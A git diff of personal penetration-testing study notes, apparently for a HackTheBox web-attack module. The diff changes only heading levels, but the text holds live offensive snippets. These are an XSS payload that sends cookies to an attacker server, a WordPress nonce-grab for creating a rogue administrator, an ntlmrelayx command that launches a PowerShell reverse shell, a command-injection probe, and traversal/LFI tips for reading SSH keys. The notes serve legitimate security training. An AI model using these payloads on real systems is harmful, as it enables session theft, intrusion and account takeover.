@@ -7,7 +7,7 @@ pagetitle: Attacking Web Applications
 
 [HackTheBox - Attacking Common Services](https://academy.hackthebox.com/module/116/section/1140)
 
-### Enumeration
+## Enumeration
 - Install Wappalyzer when doing boxes/taking test
 - `gobuster`
 	- Very noisy! Enumerates dirs/files
@@ -21,7 +21,7 @@ pagetitle: Attacking Web Applications
 - `whatweb` is like a local wappalyzer on kali
 	- `whatweb http://{IP}`
 
-### Exploitation
+## Exploitation
 - Finding default passwords for HTTP basic auth
 	- Use [LoginHunter](https://github.com/InfosecMatter/default-http-login-hunter) with a list of hosts to find things like cameras w default passwords
 	- Can be very useful on internal engagements with hundreds/thousands of webservers
@@ -32,7 +32,7 @@ pagetitle: Attacking Web Applications
 - If HttpOnly flag isn't on Auth cookies, we can steal them w/ XSS
 	- `<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>`
 
-### XSS Exploitation Example
+## XSS Exploitation Example
 - Grabbing a nonce value from /wp-admin/user-new.php
 	- var ajaxRequest = new XMLHttpRequest(); 
 	- var requestURL = "/wp-admin/user-new.php"; 
@@ -43,7 +43,7 @@ pagetitle: Attacking Web Applications
 	- var nonce = nonceMatch\[1];
 - Then, use that `nonce` variable with /wp-admin/user-new.php to create a new administrator
 
-### Directory Traversal
+## Directory Traversal
 - Test Windows traversal with `C:\Windows\System32\drivers\etc\hosts` (if win.ini not working)
 - DT to system access on Windows:
 	- Look in home directories for `.ssh`
@@ -54,7 +54,7 @@ pagetitle: Attacking Web Applications
 - Also, if we can pass IPs, use for stealing NTLM hash
 	- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c "powershell -enc {reverse_shell}"`
 
-### File Inclusion
+## File Inclusion
 - Different from directory traversal - directory traversal refers to simply retrieving contents, whereas LFI means the contents of the file are executed
 - LFI example attack path
 	- Can access local files with ?page=
@@ -74,16 +74,16 @@ pagetitle: Attacking Web Applications
 	- **/opt/install.txt** (or **C:\\Users\\install.txt**)
 	- **/opt/passwords**
 
-### File Upload
+## File Upload
 - SVG upload can lead to XXE
 - webshells found at /usr/share/webshells
 - On boxes, try changing filename to include `../` - could upload root ssh key
 
-### Command Injection
+## Command Injection
 - ``dir 2>&1 \*\`|echo CMD);&<# rem #>echo PowerShell`` will check injected shell type
 - Can use powershell for creating shells
 
-### Wordpress
+## Wordpress
 - Use `wpscan` and investigate the plugins
 	- `wpscan --url http://{IP} --enumerate p --plugins-detection aggressive`
 	- Look for `[!] This version is out of date`
